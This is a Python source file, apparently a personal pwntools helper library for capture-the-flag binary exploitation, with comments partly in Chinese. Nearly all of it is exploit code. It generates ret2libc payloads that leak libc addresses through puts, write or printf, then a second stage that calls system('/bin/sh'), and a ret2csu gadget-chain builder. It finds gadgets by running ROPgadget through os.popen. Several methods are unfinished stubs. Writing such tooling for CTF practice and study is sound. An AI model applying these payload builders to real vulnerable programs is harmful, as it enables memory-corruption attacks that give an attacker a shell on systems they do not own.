from pwn import *
import os
import subprocess
from helper import loader
from collections import defaultdict as dd

# TODO 添加对LibcSearcher的支持
# https://github.com/dev2ero/LibcSearcher

def get_output(s):
    info(f"running cmd: {s}")
    res = int(os.popen(s).readlines()[0][:-1],16)
    return res

def rop(root, code):
    # pop rdi ; ret
    cmd = f"ROPgadget --binary {root} | grep ': {code}' | cut -d ' ' -f 1"
    return get_output(cmd)

a_or_b = lambda a, b : b if a is None else a

class Ret2libc:
    def __init__(self) -> None:
        self.elf = loader.elf
        pass

    def leak(self):
        pass

    def system(self):
        pass

    def i386_leak(self, tool: str, to_leak: str=None, next_addr: int=None, fill2ret:bytes=None, **kwargs):
        elf = self.elf
        fill2ret = a_or_b(fill2ret, b"")
        to_leak = a_or_b(to_leak, tool)
        next_addr = a_or_b(next_addr, elf.sym['main'])
        def build_puts():
            return flat([
                fill2ret,
                elf.plt[tool],
                next_addr,
                elf.got[to_leak],
            ])

        def build_write():
            return flat([
                fill2ret,
                elf.plt[tool],
                next_addr,
                1,
                elf.got[to_leak],
                4
            ])
            pass
        
        def build_printf(fmt_str_addr: int):
            return flat([
                fill2ret,
                elf.plt[tool],
                next_addr,
                fmt_str_addr,
                elf.got[to_leak],
            ])
        
        if tool not in ['puts','write','printf']:
            warning(f"I never use this func to leak addr of libc: {tool}")
            exit()

    def i386_sys(self):
        pass

    def amd64_leak(self):
        def build_puts():
            pass
        def build_write():
            pass
        def build_printf():
            pass
        pass

    def amd64_sys(self):
        pass

def ret2libc_A(tool:str,next:int,fill2ret,fmt_str=None,**kwargs):
    """function that help you to get the address of some function
    ** if you use printf as tool, you need to find fmt_str **
        for example: 
            use [puts](exec puts' plt) to show addr of [__malloc_hook]   
    Args:
        tool (str): tool function u'll use to leak the addr
        next (int): next address your program will jump to
        fill2ret (_type_): payload cover ebp
        fmt_str (int, optional): used in printf func.
        to_leak (str, optional): func_name u want to leak, if not set, u'll get the addr of `tool`

    Returns:
        bytes: payload
    """

    kwargs = dd(str,kwargs)
    to_leak = kwargs['to_leak'] if kwargs['to_leak'] else tool
    elf = loader.elf
    if tool not in ['puts','write','printf']:
        warning(f"I never use this func to leak addr of libc: {tool}")
        exit()
    if context.arch == 'i386':
        info("using i386 ret2libc auto...")
        psize = p32
        if tool == "puts":
            payload = flat([
                fill2ret,
                elf.plt[tool],
                next,
                elf.got[to_leak],
            ])
        elif tool == "write":
            payload = fill2ret+psize(elf.plt[tool])+psize(next)+psize(1)+psize(elf.got[to_leak])+p32(4)
        elif tool == "printf":
            if fmt_str is None:
                warning("fmt_str needed!")
                exit()
            payload = fill2ret+psize(elf.plt[tool])+psize(next)+psize(fmt_str)+psize(elf.got[to_leak])
        else:
            error("tool error!!!")
    elif context.arch == "amd64":
        info("using amd64 ret2libc auto...")
        psize = p64
        root = loader.root
        pop_rdi_ret   =   rop(root,'pop rdi ; ret')
        pop_rsi_r15_ret = rop(root,'pop rsi ; pop r15 ; ret')
        if tool == "puts":
            payload = fill2ret+psize(pop_rdi_ret)+psize(elf.got[to_leak])+\
                      psize(elf.plt[tool])+psize(next)
        elif tool == "write":
            payload = fill2ret+psize(pop_rdi_ret)+psize(1)+\
                      psize(pop_rsi_r15_ret)+psize(elf.got[to_leak])+psize(0)+\
                      psize(elf.plt[tool])+psize(next)
        elif tool == "printf":
            if not fmt_str:
                warning("fmt_str needed!")
                exit()
            payload = fill2ret+psize(pop_rdi_ret)+psize(fmt_str)+ \
                      psize(pop_rsi_r15_ret)+psize(elf.got[to_leak])+psize(0)+\
                      psize(elf.plt[tool])+psize(next)
    return payload

def ret2libc_B(to_leak:str,leak_addr,libc,fill2ret):
    """
    to_leak:    func_name
    leak_addr:  addr(int)
    libc:       ELF("libc-2.27.so")
    fill2ret:   payload cover ebp
    **use leaked address to get system & binsh**
    """
    psize = p32 if context.arch == 'i386' else p64
    libc_base = leak_addr - libc.symbols[to_leak]
    print(hex(libc_base))
    libc.address = libc_base
    system = libc.symbols['system']
    binsh  = next(libc.search(b'/bin/sh'))
    
    info(f"system {hex(system)} ; binsh {hex(binsh)}")
    if context.arch == "i386":
        # payload = fill2ret + psize(system)+psize(0x12345678)+psize(binsh)
        """
        这里因为一道题的机制，printf把0x12345678作为参数传进去导致了sf，所以把它换成了可打印的指针
        """
        payload = fill2ret + psize(system)+psize(binsh)+psize(binsh)
        
    elif context.arch == "amd64":
        ret = rop(loader.root, "ret")
        pop_rdi_ret = rop(loader.root, "pop rdi ; ret")
        payload = fill2ret + psize(ret)+psize(pop_rdi_ret)+psize(binsh)+psize(system)
    return payload

def make_syscall():
    pass


def ret2csu(func: int, edi: int, rsi: int, rdx: int, next: int, loader, csu_sym=None):
    """
    edi, rsi, rdx 是x64的前三个参数对应的寄存器
    """
    if not csu_sym:
        cmd = f'ROPgadget --binary {loader.root} | grep "pop rdi ; ret"'
        res = os.popen(cmd).readlines()[0][:-1].split(":")[0]
        res = int(res,16)
        # 4007c3 4007ba 4007a0
        csu_p2, csu_p1 = res-(0xc3-0xba), res-(0xc3-0xa0)
        # p2 是 6个pop加上ret
    else:
        # 760 4007ba 4007a0
        csu_p2, csu_p1 = csu_sym-(0x60-0xba), csu_sym-(0x60-0xa0)
    # csu_p2 : pop rbx rbp r12 r13 r14 r15 retn
    # csu_p1 : mov2 rdx rsi edi; call cmp jnz
    # in p1:
        # add rbx, 1
        # cmp rbx, rbp
        # jnz 不相等才循环
    # payload = flat([
    #     csu_p2, 
    #     0,      # pop to rbx
    #     1,      # pop to rbp
    #     func,   # pop to r12 -> will be called with rbx=0
    #     rdx,    # pop to r13 -> mov to rdx
    #     rsi,    # pop to r14 -> mov to rsi
    #     edi,    # pop to r15 -> mov to edi
    #     csu_p1,
    #     b"a"*0x38,  # 1*`add rsp,8` & 6*`pop`
    #     next
    # ])
    payload = flat([
        csu_p2, 
        0,      # pop to rbx
        1,      # pop to rbp
        edi,   # pop to r12 -> edi
        rsi,    # pop to r13 -> rsi
        rdx,    # pop to r14 -> rdx
        func,    # pop to r15 -> func call
        csu_p1,
        b"a"*0x38,  # 1*`add rsp,8` & 6*`pop`
        next
    ])
    return payload


    



